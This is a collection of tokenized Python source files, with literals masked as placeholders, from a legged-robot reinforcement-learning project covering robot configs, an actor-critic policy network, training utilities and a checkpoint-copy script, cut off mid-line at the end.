<s> from legged_gym . envs . base . legged_robot_config import LeggedRobotCfg , LeggedRobotCfgPPO <EOL> class Go1RoughCfg ( LeggedRobotCfg ) : <EOL> class init_state ( LeggedRobotCfg . init_state ) : <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> default_joint_angles = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> } <EOL> class init_state_slope ( LeggedRobotCfg . init_state ) : <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> default_joint_angles = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> } <EOL> class control ( LeggedRobotCfg . control ) : <EOL> control_type = '<STR_LIT>' <EOL> stiffness = { '<STR_LIT>' : <NUM_LIT> } <EOL> damping = { '<STR_LIT>' : <NUM_LIT> } <EOL> action_scale = <NUM_LIT> <EOL> decimation = <NUM_LIT> <EOL> class asset ( LeggedRobotCfg . asset ) : <EOL> file = '<STR_LIT>' <EOL> foot_name = "<STR_LIT>" <EOL> penalize_contacts_on = [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> terminate_after_contacts_on = [ "<STR_LIT>" ] <EOL> self_collisions = <NUM_LIT> <EOL> class rewards ( LeggedRobotCfg . rewards ) : <EOL> soft_dof_pos_limit = <NUM_LIT> <EOL> base_height_target = <NUM_LIT> <EOL> class Go1RoughCfgPPO ( LeggedRobotCfgPPO ) : <EOL> class algorithm ( LeggedRobotCfgPPO . algorithm ) : <EOL> entropy_coef = <NUM_LIT> <EOL> class runner ( LeggedRobotCfgPPO . runner ) : <EOL> run_name = '<STR_LIT>' <EOL> experiment_name = '<STR_LIT>' <EOL> </s>
<s> from time import time <EOL> import numpy as np <EOL> import os <EOL> from isaacgym . torch_utils import * <EOL> from isaacgym import gymtorch , gymapi , gymutil <EOL> import torch <EOL> from typing import Tuple , Dict <EOL> from legged_gym . envs import LeggedRobot <EOL> class Cassie ( LeggedRobot ) : <EOL> def _reward_no_fly ( self ) : <EOL> contacts = self . contact_forces [ : , self . feet_indices , <NUM_LIT> ] > <NUM_LIT> <EOL> single_contact = torch . sum ( <NUM_LIT> * contacts , dim = <NUM_LIT> ) == <NUM_LIT> <EOL> return <NUM_LIT> * single_contact <EOL> </s>
<s> import torch <EOL> def split_and_pad_trajectories ( tensor , dones ) : <EOL> dones = dones . clone ( ) <EOL> dones [ - <NUM_LIT> ] = <NUM_LIT> <EOL> flat_dones = dones . transpose ( <NUM_LIT> , <NUM_LIT> ) . reshape ( - <NUM_LIT> , <NUM_LIT> ) <EOL> done_indices = torch . cat ( ( flat_dones . new_tensor ( [ - <NUM_LIT> ] , dtype = torch . int64 ) , flat_dones . nonzero ( ) [ : , <NUM_LIT> ] ) ) <EOL> trajectory_lengths = done_indices [ <NUM_LIT> : ] - done_indices [ : - <NUM_LIT> ] <EOL> trajectory_lengths_list = trajectory_lengths . tolist ( ) <EOL> trajectories = torch . split ( tensor . transpose ( <NUM_LIT> , <NUM_LIT> ) . flatten ( <NUM_LIT> , <NUM_LIT> ) , trajectory_lengths_list ) <EOL> padded_trajectories = torch . nn . utils . rnn . pad_sequence ( trajectories ) <EOL> trajectory_masks = trajectory_lengths > torch . arange ( <NUM_LIT> , tensor . shape [ <NUM_LIT> ] , device = tensor . device ) . unsqueeze ( <NUM_LIT> ) <EOL> return padded_trajectories , trajectory_masks <EOL> def unpad_trajectories ( trajectories , masks ) : <EOL> return trajectories . transpose ( <NUM_LIT> , <NUM_LIT> ) [ masks . transpose ( <NUM_LIT> , <NUM_LIT> ) ] . view ( - <NUM_LIT> , trajectories . shape [ <NUM_LIT> ] , trajectories . shape [ - <NUM_LIT> ] ) . transpose ( <NUM_LIT> , <NUM_LIT> ) <EOL> </s>
<s> import numpy as np <EOL> import code <EOL> import torch <EOL> import torch . nn as nn <EOL> from torch . distributions import Normal <EOL> from torch . nn . modules import rnn <EOL> from torch . nn . modules . activation import ReLU <EOL> class StateHistoryEncoder ( nn . Module ) : <EOL> def __init__ ( self , activation_fn , input_size , tsteps , output_size , tanh_encoder_output = False ) : <EOL> super ( StateHistoryEncoder , self ) . __init__ ( ) <EOL> self . activation_fn = activation_fn <EOL> self . tsteps = tsteps <EOL> channel_size = <NUM_LIT> <EOL> self . encoder = nn . Sequential ( <EOL> nn . Linear ( input_size , <NUM_LIT> * channel_size ) , self . activation_fn , <EOL> ) <EOL> if tsteps == <NUM_LIT> : <EOL> self . conv_layers = nn . Sequential ( <EOL> nn . Conv1d ( in_channels = <NUM_LIT> * channel_size , out_channels = <NUM_LIT> * channel_size , kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , self . activation_fn , <EOL> nn . Conv1d ( in_channels = <NUM_LIT> * channel_size , out_channels = channel_size , kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , self . activation_fn , <EOL> nn . Conv1d ( in_channels = channel_size , out_channels = channel_size , kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , self . activation_fn , nn . Flatten ( ) ) <EOL> elif tsteps == <NUM_LIT> : <EOL> self . conv_layers = nn . Sequential ( <EOL> nn . Conv1d ( in_channels = <NUM_LIT> * channel_size , out_channels = <NUM_LIT> * channel_size , kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , self . activation_fn , <EOL> nn . Conv1d ( in_channels = <NUM_LIT> * channel_size , out_channels = channel_size , kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , self . activation_fn , <EOL> nn . Flatten ( ) ) <EOL> elif tsteps == <NUM_LIT> : <EOL> self . conv_layers = nn . Sequential ( <EOL> nn . Conv1d ( in_channels = <NUM_LIT> * channel_size , out_channels = <NUM_LIT> * channel_size , kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , self . activation_fn , <EOL> nn . Conv1d ( in_channels = <NUM_LIT> * channel_size , out_channels = channel_size , kernel_size = <NUM_LIT> , stride = <NUM_LIT> ) , self . activation_fn , <EOL> nn . Flatten ( ) ) <EOL> else : <EOL> raise ( ValueError ( "<STR_LIT>" ) ) <EOL> self . linear_output = nn . Sequential ( <EOL> nn . Linear ( channel_size * <NUM_LIT> , output_size ) , self . activation_fn <EOL> ) <EOL> def forward ( self , obs ) : <EOL> nd = obs . shape [ <NUM_LIT> ] <EOL> T = self . tsteps <EOL> projection = self . encoder ( obs . reshape ( [ nd * T , - <NUM_LIT> ] ) ) <EOL> output = self . conv_layers ( projection . reshape ( [ nd , T , - <NUM_LIT> ] ) . permute ( ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) ) ) <EOL> output = self . linear_output ( output ) <EOL> return output <EOL> class Actor ( nn . Module ) : <EOL> def __init__ ( self , num_prop , <EOL> num_scan , <EOL> num_actions , <EOL> scan_encoder_dims , <EOL> actor_hidden_dims , <EOL> priv_encoder_dims , <EOL> num_priv_latent , <EOL> num_priv_explicit , <EOL> num_hist , activation , <EOL> tanh_encoder_output = False ) -> None : <EOL> super ( ) . __init__ ( ) <EOL> self . num_prop = num_prop <EOL> self . num_scan = num_scan <EOL> self . num_hist = num_hist <EOL> self . num_actions = num_actions <EOL> self . num_priv_latent = num_priv_latent <EOL> self . num_priv_explicit = num_priv_explicit <EOL> self . if_scan_encode = scan_encoder_dims is not None and num_scan > <NUM_LIT> <EOL> if len ( priv_encoder_dims ) > <NUM_LIT> : <EOL> priv_encoder_layers = [ ] <EOL> priv_encoder_layers . append ( nn . Linear ( num_priv_latent , priv_encoder_dims [ <NUM_LIT> ] ) ) <EOL> priv_encoder_layers . append ( activation ) <EOL> for l in range ( len ( priv_encoder_dims ) - <NUM_LIT> ) : <EOL> priv_encoder_layers . append ( nn . Linear ( priv_encoder_dims [ l ] , priv_encoder_dims [ l + <NUM_LIT> ] ) ) <EOL> priv_encoder_layers . append ( activation ) <EOL> self . priv_encoder = nn . Sequential ( * priv_encoder_layers ) <EOL> priv_encoder_output_dim = priv_encoder_dims [ - <NUM_LIT> ] <EOL> else : <EOL> self . priv_encoder = nn . Identity ( ) <EOL> priv_encoder_output_dim = num_priv_latent <EOL> self . history_encoder = StateHistoryEncoder ( activation , num_prop , num_hist , priv_encoder_output_dim ) <EOL> if self . if_scan_encode : <EOL> scan_encoder = [ ] <EOL> scan_encoder . append ( nn . Linear ( num_scan , scan_encoder_dims [ <NUM_LIT> ] ) ) <EOL> scan_encoder . append ( activation ) <EOL> for l in range ( len ( scan_encoder_dims ) - <NUM_LIT> ) : <EOL> if l == len ( scan_encoder_dims ) - <NUM_LIT> : <EOL> scan_encoder . append ( nn . Linear ( scan_encoder_dims [ l ] , scan_encoder_dims [ l + <NUM_LIT> ] ) ) <EOL> scan_encoder . append ( nn . Tanh ( ) ) <EOL> else : <EOL> scan_encoder . append ( nn . Linear ( scan_encoder_dims [ l ] , scan_encoder_dims [ l + <NUM_LIT> ] ) ) <EOL> scan_encoder . append ( activation ) <EOL> self . scan_encoder = nn . Sequential ( * scan_encoder ) <EOL> self . scan_encoder_output_dim = scan_encoder_dims [ - <NUM_LIT> ] <EOL> else : <EOL> self . scan_encoder = nn . Identity ( ) <EOL> self . scan_encoder_output_dim = num_scan <EOL> actor_layers = [ ] <EOL> actor_layers . append ( nn . Linear ( num_prop + <EOL> self . scan_encoder_output_dim + <EOL> num_priv_explicit + <EOL> priv_encoder_output_dim , <EOL> actor_hidden_dims [ <NUM_LIT> ] ) ) <EOL> actor_layers . append ( activation ) <EOL> for l in range ( len ( actor_hidden_dims ) ) : <EOL> if l == len ( actor_hidden_dims ) - <NUM_LIT> : <EOL> actor_layers . append ( nn . Linear ( actor_hidden_dims [ l ] , num_actions ) ) <EOL> else : <EOL> actor_layers . append ( nn . Linear ( actor_hidden_dims [ l ] , actor_hidden_dims [ l + <NUM_LIT> ] ) ) <EOL> actor_layers . append ( activation ) <EOL> if tanh_encoder_output : <EOL> actor_layers . append ( nn . Tanh ( ) ) <EOL> self . actor_backbone = nn . Sequential ( * actor_layers ) <EOL> def forward ( self , obs , hist_encoding : bool , eval = False , scandots_latent = None ) : <EOL> if not eval : <EOL> if self . if_scan_encode : <EOL> obs_scan = obs [ : , self . num_prop : self . num_prop + self . num_scan ] <EOL> if scandots_latent is None : <EOL> scan_latent = self . scan_encoder ( obs_scan ) <EOL> else : <EOL> scan_latent = scandots_latent <EOL> obs_prop_scan = torch . cat ( [ obs [ : , : self . num_prop ] , scan_latent ] , dim = <NUM_LIT> ) <EOL> else : <EOL> obs_prop_scan = obs [ : , : self . num_prop + self . num_scan ] <EOL> obs_priv_explicit = obs [ : , self . num_prop + self . num_scan : self . num_prop + self . num_scan + self . num_priv_explicit ] <EOL> if hist_encoding : <EOL> latent = self . infer_hist_latent ( obs ) <EOL> else : <EOL> latent = self . infer_priv_latent ( obs ) <EOL> backbone_input = torch . cat ( [ obs_prop_scan , obs_priv_explicit , latent ] , dim = <NUM_LIT> ) <EOL> backbone_output = self . actor_backbone ( backbone_input ) <EOL> return backbone_output <EOL> else : <EOL> if self . if_scan_encode : <EOL> obs_scan = obs [ : , self . num_prop : self . num_prop + self . num_scan ] <EOL> if scandots_latent is None : <EOL> scan_latent = self . scan_encoder ( obs_scan ) <EOL> else : <EOL> scan_latent = scandots_latent <EOL> obs_prop_scan = torch . cat ( [ obs [ : , : self . num_prop ] , scan_latent ] , dim = <NUM_LIT> ) <EOL> else : <EOL> obs_prop_scan = obs [ : , : self . num_prop + self . num_scan ] <EOL> obs_priv_explicit = obs [ : , self . num_prop + self . num_scan : self . num_prop + self . num_scan + self . num_priv_explicit ] <EOL> if hist_encoding : <EOL> latent = self . infer_hist_latent ( obs ) <EOL> else : <EOL> latent = self . infer_priv_latent ( obs ) <EOL> backbone_input = torch . cat ( [ obs_prop_scan , obs_priv_explicit , latent ] , dim = <NUM_LIT> ) <EOL> backbone_output = self . actor_backbone ( backbone_input ) <EOL> return backbone_output <EOL> def infer_priv_latent ( self , obs ) : <EOL> priv = obs [ : , self . num_prop + self . num_scan + self . num_priv_explicit : self . num_prop + self . num_scan + self . num_priv_explicit + self . num_priv_latent ] <EOL> return self . priv_encoder ( priv ) <EOL> def infer_hist_latent ( self , obs ) : <EOL> hist = obs [ : , - self . num_hist * self . num_prop : ] <EOL> return self . history_encoder ( hist . view ( - <NUM_LIT> , self . num_hist , self . num_prop ) ) <EOL> def infer_scandots_latent ( self , obs ) : <EOL> scan = obs [ : , self . num_prop : self . num_prop + self . num_scan ] <EOL> return self . scan_encoder ( scan ) <EOL> class ActorCriticRMA ( nn . Module ) : <EOL> is_recurrent = False <EOL> def __init__ ( self , num_prop , <EOL> num_scan , <EOL> num_critic_obs , <EOL> num_priv_latent , <EOL> num_priv_explicit , <EOL> num_hist , <EOL> num_actions , <EOL> scan_encoder_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> actor_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> critic_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> activation = '<STR_LIT>' , <EOL> init_noise_std = <NUM_LIT> , <EOL> ** kwargs ) : <EOL> if kwargs : <EOL> print ( "<STR_LIT>" + str ( [ key for key in kwargs . keys ( ) ] ) ) <EOL> super ( ActorCriticRMA , self ) . __init__ ( ) <EOL> self . kwargs = kwargs <EOL> priv_encoder_dims = kwargs [ '<STR_LIT>' ] <EOL> activation = get_activation ( activation ) <EOL> self . actor = Actor ( num_prop , num_scan , num_actions , scan_encoder_dims , actor_hidden_dims , priv_encoder_dims , num_priv_latent , num_priv_explicit , num_hist , activation , tanh_encoder_output = kwargs [ '<STR_LIT>' ] ) <EOL> critic_layers = [ ] <EOL> critic_layers . append ( nn . Linear ( num_critic_obs , critic_hidden_dims [ <NUM_LIT> ] ) ) <EOL> critic_layers . append ( activation ) <EOL> for l in range ( len ( critic_hidden_dims ) ) : <EOL> if l == len ( critic_hidden_dims ) - <NUM_LIT> : <EOL> critic_layers . append ( nn . Linear ( critic_hidden_dims [ l ] , <NUM_LIT> ) ) <EOL> else : <EOL> critic_layers . append ( nn . Linear ( critic_hidden_dims [ l ] , critic_hidden_dims [ l + <NUM_LIT> ] ) ) <EOL> critic_layers . append ( activation ) <EOL> self . critic = nn . Sequential ( * critic_layers ) <EOL> self . std = nn . Parameter ( init_noise_std * torch . ones ( num_actions ) ) <EOL> self . distribution = None <EOL> Normal . set_default_validate_args = False <EOL> @ staticmethod <EOL> def init_weights ( sequential , scales ) : <EOL> [ torch . nn . init . orthogonal_ ( module . weight , gain = scales [ idx ] ) for idx , module in <EOL> enumerate ( mod for mod in sequential if isinstance ( mod , nn . Linear ) ) ] <EOL> def reset ( self , dones = None ) : <EOL> pass <EOL> def forward ( self ) : <EOL> raise NotImplementedError <EOL> @ property <EOL> def action_mean ( self ) : <EOL> return self . distribution . mean <EOL> @ property <EOL> def action_std ( self ) : <EOL> return self . distribution . stddev <EOL> @ property <EOL> def entropy ( self ) : <EOL> return self . distribution . entropy ( ) . sum ( dim = - <NUM_LIT> ) <EOL> def update_distribution ( self , observations , hist_encoding ) : <EOL> mean = self . actor ( observations , hist_encoding ) <EOL> self . distribution = Normal ( mean , mean * <NUM_LIT> + self . std ) <EOL> def act ( self , observations , hist_encoding = False , ** kwargs ) : <EOL> self . update_distribution ( observations , hist_encoding ) <EOL> return self . distribution . sample ( ) <EOL> def get_actions_log_prob ( self , actions ) : <EOL> return self . distribution . log_prob ( actions ) . sum ( dim = - <NUM_LIT> ) <EOL> def act_inference ( self , observations , hist_encoding = False , eval = False , scandots_latent = None , ** kwargs ) : <EOL> if not eval : <EOL> actions_mean = self . actor ( observations , hist_encoding , eval , scandots_latent ) <EOL> return actions_mean <EOL> else : <EOL> actions_mean , latent_hist , latent_priv = self . actor ( observations , hist_encoding , eval = True ) <EOL> return actions_mean , latent_hist , latent_priv <EOL> def evaluate ( self , critic_observations , ** kwargs ) : <EOL> value = self . critic ( critic_observations ) <EOL> return value <EOL> def reset_std ( self , std , num_actions , device ) : <EOL> new_std = std * torch . ones ( num_actions , device = device ) <EOL> self . std . data = new_std . data <EOL> def get_activation ( act_name ) : <EOL> if act_name == "<STR_LIT>" : <EOL> return nn . ELU ( ) <EOL> elif act_name == "<STR_LIT>" : <EOL> return nn . SELU ( ) <EOL> elif act_name == "<STR_LIT>" : <EOL> return nn . ReLU ( ) <EOL> elif act_name == "<STR_LIT>" : <EOL> return nn . ReLU ( ) <EOL> elif act_name == "<STR_LIT>" : <EOL> return nn . LeakyReLU ( ) <EOL> elif act_name == "<STR_LIT>" : <EOL> return nn . Tanh ( ) <EOL> elif act_name == "<STR_LIT>" : <EOL> return nn . Sigmoid ( ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> return None <EOL> </s>
<s> from setuptools import find_packages <EOL> from distutils . core import setup <EOL> setup ( <EOL> name = '<STR_LIT>' , <EOL> version = '<STR_LIT>' , <EOL> author = '<STR_LIT>' , <EOL> license = "<STR_LIT>" , <EOL> packages = find_packages ( ) , <EOL> author_email = '<STR_LIT>' , <EOL> description = '<STR_LIT>' , <EOL> install_requires = [ '<STR_LIT>' , <EOL> '<STR_LIT>' , <EOL> '<STR_LIT>' ] <EOL> ) <EOL> </s>
<s> from legged_gym . envs . base . legged_robot_config import LeggedRobotCfg , LeggedRobotCfgPPO <EOL> class A1ParkourCfg ( LeggedRobotCfg ) : <EOL> class init_state ( LeggedRobotCfg . init_state ) : <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> default_joint_angles = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> } <EOL> class control ( LeggedRobotCfg . control ) : <EOL> control_type = '<STR_LIT>' <EOL> stiffness = { '<STR_LIT>' : <NUM_LIT> } <EOL> damping = { '<STR_LIT>' : <NUM_LIT> } <EOL> action_scale = <NUM_LIT> <EOL> decimation = <NUM_LIT> <EOL> class asset ( LeggedRobotCfg . asset ) : <EOL> file = '<STR_LIT>' <EOL> foot_name = "<STR_LIT>" <EOL> penalize_contacts_on = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> terminate_after_contacts_on = [ "<STR_LIT>" ] <EOL> self_collisions = <NUM_LIT> <EOL> class rewards ( LeggedRobotCfg . rewards ) : <EOL> soft_dof_pos_limit = <NUM_LIT> <EOL> base_height_target = <NUM_LIT> <EOL> class A1ParkourCfgPPO ( LeggedRobotCfgPPO ) : <EOL> class algorithm ( LeggedRobotCfgPPO . algorithm ) : <EOL> entropy_coef = <NUM_LIT> <EOL> class runner ( LeggedRobotCfgPPO . runner ) : <EOL> run_name = '<STR_LIT>' <EOL> experiment_name = '<STR_LIT>' <EOL> </s>
<s> from legged_gym . envs import AnymalCRoughCfg , AnymalCRoughCfgPPO <EOL> class AnymalCFlatCfg ( AnymalCRoughCfg ) : <EOL> class env ( AnymalCRoughCfg . env ) : <EOL> num_observations = <NUM_LIT> <EOL> class terrain ( AnymalCRoughCfg . terrain ) : <EOL> mesh_type = '<STR_LIT>' <EOL> measure_heights = False <EOL> class asset ( AnymalCRoughCfg . asset ) : <EOL> self_collisions = <NUM_LIT> <EOL> class rewards ( AnymalCRoughCfg . rewards ) : <EOL> max_contact_force = <NUM_LIT> <EOL> class scales ( AnymalCRoughCfg . rewards . scales ) : <EOL> orientation = - <NUM_LIT> <EOL> torques = - <NUM_LIT> <EOL> feet_air_time = <NUM_LIT> <EOL> class commands ( AnymalCRoughCfg . commands ) : <EOL> heading_command = False <EOL> resampling_time = <NUM_LIT> <EOL> class ranges ( AnymalCRoughCfg . commands . ranges ) : <EOL> ang_vel_yaw = [ - <NUM_LIT> , <NUM_LIT> ] <EOL> class domain_rand ( AnymalCRoughCfg . domain_rand ) : <EOL> friction_range = [ <NUM_LIT> , <NUM_LIT> ] <EOL> class AnymalCFlatCfgPPO ( AnymalCRoughCfgPPO ) : <EOL> class policy ( AnymalCRoughCfgPPO . policy ) : <EOL> actor_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> critic_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> activation = '<STR_LIT>' <EOL> class algorithm ( AnymalCRoughCfgPPO . algorithm ) : <EOL> entropy_coef = <NUM_LIT> <EOL> class runner ( AnymalCRoughCfgPPO . runner ) : <EOL> run_name = '<STR_LIT>' <EOL> experiment_name = '<STR_LIT>' <EOL> load_run = - <NUM_LIT> <EOL> max_iterations = <NUM_LIT> <EOL> </s>
<s> from legged_gym import LEGGED_GYM_ROOT_DIR , LEGGED_GYM_ENVS_DIR <EOL> from legged_gym . envs . a1 . a1_config import A1RoughCfg , A1RoughCfgPPO <EOL> from . base . legged_robot import LeggedRobot <EOL> from . anymal_c . anymal import Anymal <EOL> from . anymal_c . mixed_terrains . anymal_c_rough_config import AnymalCRoughCfg , AnymalCRoughCfgPPO <EOL> from . anymal_c . flat . anymal_c_flat_config import AnymalCFlatCfg , AnymalCFlatCfgPPO <EOL> from . anymal_b . anymal_b_config import AnymalBRoughCfg , AnymalBRoughCfgPPO <EOL> from . cassie . cassie import Cassie <EOL> from . cassie . cassie_config import CassieRoughCfg , CassieRoughCfgPPO <EOL> from . a1 . a1_config import A1RoughCfg , A1RoughCfgPPO <EOL> from . a1 . a1_parkour_config import A1ParkourCfg , A1ParkourCfgPPO <EOL> from . go1 . go1_config import Go1RoughCfg , Go1RoughCfgPPO <EOL> import os <EOL> from legged_gym . utils . task_registry import task_registry <EOL> task_registry . register ( "<STR_LIT>" , LeggedRobot , A1ParkourCfg ( ) , A1ParkourCfgPPO ( ) ) <EOL> task_registry . register ( "<STR_LIT>" , LeggedRobot , Go1RoughCfg ( ) , Go1RoughCfgPPO ( ) ) <EOL> </s>
<s> from . rollout_storage import RolloutStorage <EOL> </s>
<s> import subprocess , os <EOL> import argparse <EOL> import socket <EOL> def main ( args ) : <EOL> host_name = socket . gethostname ( ) <EOL> logs_path_src = f"<STR_LIT>" <EOL> logs_path_dst = "<STR_LIT>" <EOL> folders = subprocess . check_output ( [ "<STR_LIT>" , f"<STR_LIT>" , "<STR_LIT>" , logs_path_src , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] ) . decode ( "<STR_LIT>" ) <EOL> folder_list = folders . split ( "<STR_LIT>" ) <EOL> for name in folder_list : <EOL> if len ( name ) >= <NUM_LIT> : <EOL> if name [ : <NUM_LIT> ] == args . exptid : <EOL> exp_path_src = os . path . join ( logs_path_src , name ) <EOL> break <EOL> models = subprocess . check_output ( [ "<STR_LIT>" , f"<STR_LIT>" , "<STR_LIT>" , exp_path_src , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] ) . decode ( "<STR_LIT>" ) <EOL> models = models . split ( "<STR_LIT>" ) <EOL> models . sort ( key = lambda m : '<STR_LIT>' . format ( m ) ) <EOL> model = models [ - <NUM_LIT> ] <EOL> if args . ckpt : <EOL> model = f"<STR_LIT>" <EOL> model_path_src = os . path . join ( exp_path_src , model ) <EOL> model_path_dst = os . path . join ( logs_path_dst , name , model ) <EOL> os . makedirs ( os . path . dirname ( model_path_dst ) , exist_ok = True ) <EOL> print ( f"<STR_LIT>" ) <EOL> p = subprocess . Popen ( [ "<STR_LIT>" , "<STR_LIT>" , <EOL> f"<STR_LIT>" + model_path_src , <EOL> model_path_dst ] ) <EOL> sts = os . waitpid ( p . pid , <NUM_LIT> ) <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( '<STR_LIT>' , type = str , required = True , default = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = str , required = True , default = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = str , required = False , default = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = str , required = False , default = '<STR_LIT>' ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> import os , sys <EOL> from statistics import mode <EOL> sys . path . append ( "<STR_LIT>" ) <EOL> import torch <EOL> import torch . nn as nn <EOL> from rsl_rl . modules . actor_critic import Actor , StateHistoryEncoder , get_activation , ActorCriticRMA <EOL> from rsl_rl . modules . estimator import Estimator <EOL> from rsl_rl . modules . depth_backbone import DepthOnlyFCBackbone58x87 , RecurrentDepthBackbone <EOL> import argparse <EOL> import code <EOL> import shutil <EOL> def get_load_path ( root , load_run = - <NUM_LIT> , checkpoint = - <NUM_LIT> , model_name_include = "<STR_LIT>" ) : <EOL> if not os . path . isdir ( root ) : <EOL> model_name_cand = os . path . basename ( root ) <EOL> model_parent = os . path . dirname ( root ) <EOL> model_names = os . listdir ( model_parent ) <EOL> model_names = [ name for name in model_names if os . path . isdir ( os . path . join ( model_parent , name ) ) ] <EOL> for name in model_names : <EOL> if len ( name ) >= <NUM_LIT> : <EOL> if name [ : <NUM_LIT> ] == model_name_cand : <EOL> root = os . path . join ( model_parent , name ) <EOL> if checkpoint == - <NUM_LIT> : <EOL> models = [ file for file in os . listdir ( root ) if model_name_include in file ] <EOL> models . sort ( key = lambda m : '<STR_LIT>' . format ( m ) ) <EOL> model = models [ - <NUM_LIT> ] <EOL> checkpoint = model . split ( "<STR_LIT>" ) [ - <NUM_LIT> ] . split ( "<STR_LIT>" ) [ <NUM_LIT> ] <EOL> else : <EOL> model = "<STR_LIT>" . format ( checkpoint ) <EOL> load_path = os . path . join ( root , model ) <EOL> return load_path , checkpoint <EOL> class HardwareVisionNN ( nn . Module ) : <EOL> def __init__ ( self , num_prop , <EOL> num_scan , <EOL> num_priv_latent , <EOL> num_priv_explicit , <EOL> num_hist , <EOL> num_actions , <EOL> tanh , <EOL> actor_hidden_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> scan_encoder_dims = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> depth_encoder_hidden_dim = <NUM_LIT> , <EOL> activation = '<STR_LIT>' , <EOL> priv_encoder_dims = [ <NUM_LIT> , <NUM_LIT> ] <EOL> ) : <EOL> super ( HardwareVisionNN , self ) . __init__ ( ) <EOL> self . num_prop = num_prop <EOL> self . num_scan = num_scan <EOL> self . num_hist = num_hist <EOL> self . num_actions = num_actions <EOL> self . num_priv_latent = num_priv_latent <EOL> self . num_priv_explicit = num_priv_explicit <EOL> num_obs = num_prop + num_scan + num_hist * num_prop + num_priv_latent + num_priv_explicit <EOL> self . num_obs = num_obs <EOL> activation = get_activation ( activation ) <EOL> self . actor = Actor ( num_prop , num_scan , num_actions , scan_encoder_dims , actor_hidden_dims , priv_encoder_dims , num_priv_latent , num_priv_explicit , num_hist , activation , tanh_encoder_output = tanh ) <EOL> self . estimator = Estimator ( input_dim = num_prop , output_dim = num_priv_explicit , hidden_dims = [ <NUM_LIT> , <NUM_LIT> ] ) <EOL> def forward ( self , obs , depth_latent ) : <EOL> obs [ : , self . num_prop + self . num_scan : self . num_prop + self . num_scan + self . num_priv_explicit ] = self . estimator ( obs [ : , : self . num_prop ] ) <EOL> return self . actor ( obs , hist_encoding = True , eval = False , scandots_latent = depth_latent ) <EOL> def play ( args ) : <EOL> load_run = "<STR_LIT>" + args . exptid <EOL> checkpoint = args . checkpoint <EOL> n_priv_explicit = <NUM_LIT> + <NUM_LIT> + <NUM_LIT> <EOL> n_priv_latent = <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> <EOL> num_scan = <NUM_LIT> <EOL> num_actions = <NUM_LIT> <EOL> depth_resized = ( <NUM_LIT> , <NUM_LIT> ) <EOL> n_proprio = <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> + <NUM_LIT> <EOL> history_len = <NUM_LIT> <EOL> device = torch . device ( '<STR_LIT>' ) <EOL> policy = HardwareVisionNN ( n_proprio , num_scan , n_priv_latent , n_priv_explicit , history_len , num_actions , args . tanh ) . 